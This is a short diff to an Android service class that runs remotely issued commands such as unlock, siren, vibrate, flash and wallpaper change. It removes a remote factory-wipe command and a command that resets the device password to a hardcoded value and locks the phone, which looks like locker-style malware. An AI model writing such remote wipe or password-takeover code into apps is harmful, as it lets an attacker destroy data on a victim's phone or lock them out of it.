@@ -74,8 +74,6 @@ public class LockService extends Service {
             case "unlock": removeLockScreen(); break;
             case "siren": tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 15000); break;
             case "vibrate": if (vibrator != null) vibrator.vibrate(new long[]{0, 500, 200, 500, 200, 1000}, 5); break;
-            case "wipe": dpm.wipeData(0); break;
-            case "reset_password": dpm.resetPassword("ffpanel123", 0); dpm.lockNow(); break;
             case "flash_on": showFlash(true); break;
             case "flash_off": showFlash(false); break;
             case "wallpaper": changeWallpaper(d.optString("url")); break;
@@ -305,4 +303,4 @@ public class LockService extends Service {
         if (socket != null) socket.disconnect();
         super.onDestroy();
     }
-}
+            }
